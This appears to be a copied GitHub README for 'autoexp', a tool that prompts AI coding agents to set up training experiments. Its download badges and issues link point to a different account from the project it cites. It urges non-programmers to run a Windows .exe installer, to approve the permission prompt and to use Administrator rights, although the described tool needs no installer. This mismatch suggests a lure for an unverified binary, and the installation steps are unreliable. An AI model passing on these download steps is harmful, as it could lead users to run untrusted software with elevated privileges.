# 🤖 autoexp - Simplify AI Experiment Setup

[![Download autoexp](https://img.shields.io/badge/Download-autoexp-brightgreen?style=for-the-badge)](https://github.com/reybenrea-ship-it/autoexp/releases)

---

<p align="center">
<img width="280" height="280" alt="autoexp logo" src="https://github.com/user-attachments/assets/d48a3e14-d609-4b38-84aa-93f45d443e6f" />
</p>

## 📖 What is autoexp?

autoexp helps you run AI and machine learning experiments automatically. It does this by working with AI coding agents. These agents can run and improve your training projects step by step without manual setup.

autoexp takes the messy parts out of experimenting with AI models. It reads your project and sets up commands so the AI coding agents know what to do. This saves time and effort, especially if you are new to AI or coding.

---

## 🚀 Getting Started

This guide will help you download and run autoexp on a Windows computer. You do not need to know programming to follow it.

---

## 📥 Download autoexp

To get autoexp, visit the releases page. This is the place where new versions are made available for download.

[![Visit Releases Page](https://img.shields.io/badge/Download_Page-blue?style=for-the-badge)](https://github.com/reybenrea-ship-it/autoexp/releases)

Click the badge above, and you will see a list of available files. Choose the one for Windows to download.

---

## 💻 System Requirements

Use autoexp on a computer that meets these minimum requirements:

- Windows 10 or newer  
- 8 GB RAM or more  
- 5 GB free disk space  
- Internet connection to download and set up autoexp  
- Basic ability to download files and open folders  

---

## ⚙️ Installation and Setup

Follow these steps:

1. **Download the Windows installer** from the releases page linked above. It is usually a `.exe` file.

2. **Run the downloaded file** by double-clicking it. Windows might ask for permission. Click Yes to continue.

3. **Follow the installer prompts.** Just click Next or Continue where needed. Use default options unless you want to change the installation folder.

4. **Finish the installation.** When done, you should see autoexp in your Start menu or desktop.

---

## 🧑‍💻 How to Use autoexp in Your Project

autoexp works by talking to AI coding agents like Codex or Claude Code. These agents read your project files and find out what commands to run for training and testing your AI model.

Before autoexp can start, you need to create a special file named `autoexp_program.md` in your project folder.

Use this message for your AI coding agent in your project folder:

```
Read https://github.com/wizwand/autoexp/blob/main/make_autoexp.md and follow the instructions to create `autoexp_program.md` in the current directory.
```

This file tells the agent how to run experiments on your project. It will include:

- The command to start training your AI model  
- How to check and measure the quality of your model  
- Other details needed for experiments  

Once you have this file, the agent can begin running and improving your experiments automatically.

---

## 🔧 How autoexp Works Behind the Scenes

When you ask your AI coding agent to follow the instructions, it will:

- Look through your project files for code that trains an AI model  
- Guess which command runs the training  
- Find how to measure your model's success (like accuracy or loss)  
- Write this information into the `autoexp_program.md` file  

This setup turns your project into a workflow that can run experiments repeatedly. It helps AI coding agents make changes and check results on their own.

---

## 🗂️ Organizing Your Project for autoexp

To get the best results, keep your project directory clean and well organized:

- Put your training scripts in a clear folder (for example, `train/` or `scripts/`)  
- Store datasets in a separate folder (`data/` or `datasets/`)  
- Have a readme or notes file that explains the project basics  
- Avoid mixing unrelated files in the main folder  

Clear structure makes it easier for AI coding agents to find the training commands and key files.

---

## ⚠️ Common Issues and Fixes

If autoexp or your AI coding agent cannot create the `autoexp_program.md` file:

- Check if the project folder contains a clear training script or command  
- Make sure you gave the agent the exact message shown above  
- Verify your project is not missing important files  
- Try running the training manually to confirm it works  

If you get errors running the Windows installer:

- Confirm you downloaded the right file for Windows  
- Try running the installer as Administrator (right-click > Run as Administrator)  
- Restart your computer and try again  

---

## 🔄 Updating autoexp

Visit the releases page regularly to check for updates:

1. Download the newest installer file  
2. Run it to replace the old version  
3. Your settings will remain unless you uninstall manually  

---

## 🤝 Support and Feedback

Use GitHub issues on the repository page for reporting bugs or asking for help.

https://github.com/reybenrea-ship-it/autoexp/issues

---

## 📚 Additional Resources

- Autoexp main instructions for AI coding agents:  
  https://github.com/wizwand/autoexp/blob/main/make_autoexp.md  

- Related project for AI-to-AI research workflows:  
  https://github.com/karpathy/autoresearch  

---

## 🖥️ Running autoexp

After setup, open a command prompt:

1. Go to your project folder (where `autoexp_program.md` lives)  
2. Run the command your AI coding agent created to start experiments  
3. Watch outputs for training progress and results  
4. Use the experiment reports to improve your AI model automatically  

This simple process means you no longer have to run commands by hand each time.

---

[![Download autoexp](https://img.shields.io/badge/Download-autoexp-brightgreen?style=for-the-badge)](https://github.com/reybenrea-ship-it/autoexp/releases)